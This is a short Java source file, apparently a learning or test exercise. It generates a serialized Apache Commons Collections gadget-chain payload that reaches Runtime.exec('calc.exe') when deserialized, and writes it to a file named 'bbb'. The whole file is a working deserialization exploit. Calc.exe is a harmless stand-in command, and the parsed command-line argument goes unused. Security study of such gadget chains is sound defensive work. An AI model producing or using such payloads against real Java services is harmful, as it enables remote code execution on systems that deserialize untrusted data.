package test;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;  

import java.util.Map;
import java.util.HashMap;   

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;   

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer; 
 

public class Generate { 

    public static Object getAnnotationInvocationHandler(String command) throws Exception {
        String[] execArgs = command.split(",");
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {
                        String.class }, new Object[] {"calc.exe"})};
        
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map tempMap = new HashMap();
        tempMap.put("value", "value");
        Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        //setValue会触发transform方法
//        Map.Entry onlyElement = (Map.Entry) exMap.entrySet().iterator().next();
//        onlyElement.setValue("foobar");
        Person p = new Person();
        p.map = exMap;
        return p;
    }   

    public static void main(String[] args) throws Exception {
        String command = (args.length != 0) ? args[0] : "calc.exe"; 

        Object obj = getAnnotationInvocationHandler(command);
        File f = new File("bbb");
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(obj);
    }
}